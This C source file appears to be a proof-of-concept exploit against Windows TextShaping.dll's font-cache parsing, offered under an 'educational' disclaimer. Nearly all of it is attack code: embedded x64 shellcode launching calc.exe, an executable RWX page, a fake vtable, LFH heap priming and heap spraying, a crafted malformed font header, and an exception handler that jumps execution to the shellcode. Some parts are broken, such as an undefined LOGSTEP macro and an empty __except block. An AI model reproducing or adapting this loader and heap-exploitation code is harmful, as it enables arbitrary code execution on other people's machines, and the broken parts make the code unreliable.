/********************************************************************************************
* DISCLAIMER:
* This code is provided strictly for educational and research purposes only.
* The author(s) and distributor(s) of this code are NOT responsible for any direct or indirect
* damages, misuse, or consequences resulting from its use. This code may interact with system
* internals, memory, or third-party components in ways that could be disruptive or dangerous.
* DO NOT use this code in production, on systems you do not own, or without explicit permission.
* Adjustments may be required for your environment, and you assume all responsibility for any
* modifications or usage.
********************************************************************************************/

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <errno.h>   
#include <DbgHelp.h>
#include <string.h>
#pragma comment(lib, "DbgHelp.lib")




#define LOGSUCCESS(fmt, ...) printf("[+] " fmt "\n", ##__VA_ARGS__)
#define LOGFAIL(fmt, ...)    printf("[-] " fmt "\n", ##__VA_ARGS__)
#ifndef MAX
#define MAX(a,b) ((a) > (b) ? (a) : (b))
#endif


unsigned char myShellcodeBytes[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

static void *g_shellPage = NULL;




static void write_u32_be(uint8_t *p, uint32_t v) {
    p[0] = (v >> 24) & 0xFF;
    p[1] = (v >> 16) & 0xFF;
    p[2] = (v >>  8) & 0xFF;
    p[3] = (v      ) & 0xFF;
}
static void write_u16_be(uint8_t *p, uint16_t v) {
    p[0] = (v >> 8) & 0xFF;
    p[1] = (v     ) & 0xFF;
}



LONG WINAPI VehHandler(PEXCEPTION_POINTERS info) {
    if (info->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
        CONTEXT *ctx = info->ContextRecord; // CPU register context at crash
        printf("\n*** AV caught in handler!\n");
        printf(" RAX=0x%llx, RIP=0x%llx, FaultAddr=0x%llx\n",
               ctx->Rax, ctx->Rip, (unsigned long long)info->ExceptionRecord->ExceptionAddress);

        HANDLE h = CreateFileA("C:\\Users\\redac\\Desktop\\wordbug\\crash.dmp",
                                GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        if (h != INVALID_HANDLE_VALUE) {
            MiniDumpWriteDump(GetCurrentProcess(), GetCurrentProcessId(), h,
                              MiniDumpWithFullMemory, NULL, NULL, NULL);
            CloseHandle(h);
        } else {
            printf("Failed to create crash dump file!\n");
        }

        ctx->Rip = (DWORD64)g_shellPage;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}



typedef struct _CCACHE_SLOT {
    uint32_t magic;        
    uint64_t vtable_ptr;   
    uint8_t reserved[24];  
} CCACHE_SLOT;


static CCACHE_SLOT templateSlot = {
    .magic        = 0xDEADBEEF,
    .vtable_ptr   = 0x4141414141414141ULL,
    .reserved     = {0}
};


static void enable_lfh(HANDLE hHeap) {
    ULONG heapFragValue = 2; 
    HeapSetInformation(
        hHeap,
        HeapCompatibilityInformation,
        &heapFragValue,
        sizeof(heapFragValue)
    );
}


#define LFH_BUCKET   0x62
#define SUBSEG_SLOTS (ULONG)(0x1000 / (LFH_BUCKET + 0x10))  

static void prime_lfh_free_list(HANDLE hHeap) {
    void *chunks[SUBSEG_SLOTS];
    for (ULONG i = 0; i < SUBSEG_SLOTS; i++) {
        chunks[i] = HeapAlloc(hHeap, 0, LFH_BUCKET);
        if (!chunks[i])
            printf("[-] prime alloc %u failed: %lu\n", i, GetLastError());
    }
    for (ULONG i = 0; i < SUBSEG_SLOTS; i++) {
        if (chunks[i])
            HeapFree(hHeap, 0, chunks[i]);
    }
    printf("[+] Primed LFH free list: %u slots at size 0x%X\n",
           SUBSEG_SLOTS, LFH_BUCKET);
}



int main(void) {
    

    HANDLE hHeap = GetProcessHeap();

    
    enable_lfh(hHeap);
    prime_lfh_free_list(hHeap);

   
    LOGSUCCESS(
        "LFH bucket priming complete: %u slots of size 0x%X",
        SUBSEG_SLOTS, LFH_BUCKET
    );

    AddVectoredExceptionHandler(1, VehHandler);
    
      

    #define VT_ENTRIES 8   
    void **fakeVtable = HeapAlloc(hHeap, 0, VT_ENTRIES * sizeof(void*));
    if (!fakeVtable) {
        LOGFAIL("alloc fake vtable");
        return 1;
    }

    
    for (int i = 0; i < VT_ENTRIES; i++) {
        fakeVtable[i] = (void*)0x4141414141414141ULL;  
    }
    templateSlot.vtable_ptr = (uint64_t)fakeVtable;

    
     SIZE_T shellSize = sizeof(myShellcodeBytes);
     void *shellPage = VirtualAlloc(
        NULL,
        shellSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!shellPage) {
        LOGFAIL("VirtualAlloc failed: %lu", GetLastError());
        return 1;
    }

   
    memcpy(shellPage, myShellcodeBytes, shellSize);
    LOGSUCCESS("Shellcode copied @ %p", shellPage);

  
    for (int i = 0; i < VT_ENTRIES; i++) {
        fakeVtable[i] = shellPage;
    } 

       
    g_shellPage = shellPage;






   
    LOGSTEP("Step 1: Loading TextShaping.dll via LoadLibraryA");
    HMODULE hTextShaping = LoadLibraryA("TextShaping.dll");
    if (!hTextShaping) {
        LOGFAIL("Failed to load TextShaping.dll (error %lu)", GetLastError());
        return 1;
    }
    LOGSUCCESS("Loaded TextShaping.dll at base address %p", (void*)hTextShaping);

    
    typedef HRESULT (WINAPI *PFN_SCFCD)(
        void**, const void*, UINT32, const void*, UINT32, UINT32
    );
    PFN_SCFCD pShapingCreateFontCacheData =
        (PFN_SCFCD)GetProcAddress(hTextShaping, "ShapingCreateFontCacheData");
    if (!pShapingCreateFontCacheData) {
        LOGFAIL("Failed to locate ShapingCreateFontCacheData (error %lu)",
                GetLastError());
        FreeLibrary(hTextShaping);
        return 1;
    }
    LOGSUCCESS("Found ShapingCreateFontCacheData at address %p",
               (void*)pShapingCreateFontCacheData);

    
    void   *pCtx = NULL;
    HRESULT hr   = E_FAIL;

   
    
    uint32_t sfntVersion = 0x00010000;    // TTF version tag
    uint16_t numTables   = 0x5000;        // bumped for testing
    uint16_t pow2 = 1, entrySelector = 0;
    while ((pow2 << 1) <= numTables) {
        pow2 <<= 1; entrySelector++;
    }
    uint32_t rawSearchRange = (uint32_t)pow2 * 16;
    uint32_t rawRangeShift  = (uint32_t)numTables * 16 - rawSearchRange;
    uint16_t searchRange    = (uint16_t)rawSearchRange;
    uint16_t rangeShift     = (uint16_t)rawRangeShift;

    
    LOGSUCCESS("  sfntVersion    = 0x%08X", sfntVersion);
    LOGSUCCESS("  numTables      = 0x%04X", numTables);
    LOGSUCCESS("  searchRange    = 0x%04X", searchRange);
    LOGSUCCESS("  entrySelector  = 0x%04X", entrySelector);
    LOGSUCCESS("  rangeShift     = 0x%04X", rangeShift);

    
    size_t headerSize = 12;
    uint8_t *buf = malloc(headerSize);
    if (!buf) {
        LOGFAIL("malloc(%zu) failed", headerSize);
        FreeLibrary(hTextShaping);
        return 1;
    }
    write_u32_be(buf + 0, sfntVersion);
    write_u16_be(buf + 4, numTables);
    write_u16_be(buf + 6, searchRange);
    write_u16_be(buf + 8, entrySelector);
    write_u16_be(buf +10, rangeShift);

    const size_t dirSize    = 12 + 2*16;
    const size_t gsubOffset = 0x50;
    const size_t gsubSize   = 0x30; 
    size_t totalSize        = MAX(dirSize, gsubOffset) + gsubSize;
    uint8_t *newBuf = realloc(buf, totalSize);
    if (!newBuf) {
        LOGFAIL("realloc(%zu) failed", totalSize);
        free(buf);
        FreeLibrary(hTextShaping);
        return 1;
    }
    buf = newBuf;


   
    write_u32_be(buf + 12 + 0, 0x47535542);    
    write_u32_be(buf + 12 + 4, 0);            
    write_u32_be(buf + 12 + 8, gsubOffset);  
    write_u32_be(buf + 12 +12, gsubSize);  
    memset(buf + 12 + 16, 0, 16);   



    uint8_t *g = buf + gsubOffset;
    write_u16_be(g + 0, 1);      
    write_u16_be(g + 2, 0);      
    write_u16_be(g + 4, 0x000A);  
    write_u16_be(g + 6, 0x0012); 
    write_u16_be(g + 8, 0x001A);  

    write_u16_be(g + 0x0A, 1);           
    write_u32_be(g + 0x0C, 0x6C61746E);  
    write_u16_be(g + 0x10, 0);         
    write_u16_be(g + 0x12, 0);        

    write_u16_be(g + 0x12, 1);          
    write_u32_be(g + 0x14, 0x6C696761);  
    write_u16_be(g + 0x18, 0);           
    write_u16_be(g + 0x1A, 1);           
    write_u16_be(g + 0x1C, 0);            
    write_u16_be(g + 0x1A, 1);           
    write_u32_be(g + 0x1C, 0x0004);      
    write_u16_be(g + 0x1E, 4);           
    write_u16_be(g + 0x20, 0);           
    write_u16_be(g + 0x22, 0);          

    pCtx = NULL;
    hr   = pShapingCreateFontCacheData(
               &pCtx,
               buf,
               (UINT32)totalSize,
               NULL,
               0,
               0
           );
    if (hr == S_OK && pCtx) {
        LOGSUCCESS("SCFCD returned context %p", pCtx);
    } else {
        LOGFAIL("ShapingCreateFontCacheData failed: 0x%08X", hr);
    }


    const char *dumpPath = "sfnt_header.bin";
    FILE *f = fopen(dumpPath, "wb");
    if (f) {
        fwrite(buf, 1, totalSize, f);
        fclose(f);
        LOGSUCCESS("Wrote buffer to file: %s", dumpPath);
    } else {
        LOGFAIL("Failed to open %s (errno %d)", dumpPath, errno);
    }



    
    #define DESIRED_OFFSET 0x12FE0
    void *pad = HeapAlloc(GetProcessHeap(), 0, DESIRED_OFFSET);
    if (!pad) {
        LOGFAIL("Pad alloc %zu failed", (size_t)DESIRED_OFFSET);
    } else {
        LOGSUCCESS("Pad of %zu bytes @ %p", (size_t)DESIRED_OFFSET, pad);
    }

    #define SPRAY_COUNT 10000
    #define SPRAY_SIZE   0x40
    const char *logPath = "spray.log";
    FILE *sprayLog = fopen(logPath, "w");
    if (!sprayLog) {
        LOGFAIL("Failed to open spray log %s (errno %d)", logPath, errno);
    } else {
        LOGSUCCESS("Logging spray addresses to %s", logPath);
    }

    void *spray[SPRAY_COUNT];
    for (int i = 0; i < SPRAY_COUNT; i++) {
        spray[i] = HeapAlloc(GetProcessHeap(), 0, SPRAY_SIZE);
        if (spray[i]) {
            memcpy(spray[i], &templateSlot, sizeof(templateSlot));
            memset((uint8_t*)spray[i] + sizeof(templateSlot),
                   0x41,
                   SPRAY_SIZE - sizeof(templateSlot));
            if (sprayLog) fprintf(sprayLog, "spray[%5d] = %p\n", i, spray[i]);
        } else if (sprayLog) {
            fprintf(sprayLog, "spray[%5d] FAILED (error %lu)\n",
                    i, GetLastError());
        }
    }
    if (sprayLog) fclose(sprayLog);

    PFN_SCFCD fn = (PFN_SCFCD)pShapingCreateFontCacheData;
    pCtx = NULL;
    __try {
        hr = fn(&pCtx, buf, (UINT32)totalSize, NULL, 0, 0);
    }
    __except (GetExceptionCode() == EXCEPTION_ACCESS_VIOLATION
              ? EXCEPTION_EXECUTE_HANDLER
              : EXCEPTION_CONTINUE_SEARCH)
  
    if (hr == S_OK && pCtx) {
        LOGSUCCESS("SCFCD returned context %p", pCtx);
        typedef void (__stdcall *PFN_CTX_METHOD)(void *);
        PFN_CTX_METHOD m0 = ((PFN_CTX_METHOD*)((void**)pCtx)[0])[0];
      
        m0(pCtx);

        free(buf);
        void *hijacked = HeapAlloc(GetProcessHeap(), 0, LFH_BUCKET);
        if (!hijacked) {
            LOGFAIL("Hijack alloc failed: %lu", GetLastError());
        } else {
            LOGSUCCESS("Hijacked chunk @ %p", hijacked);
        }
    }

   
    FreeLibrary(hTextShaping);
    return 0;
}


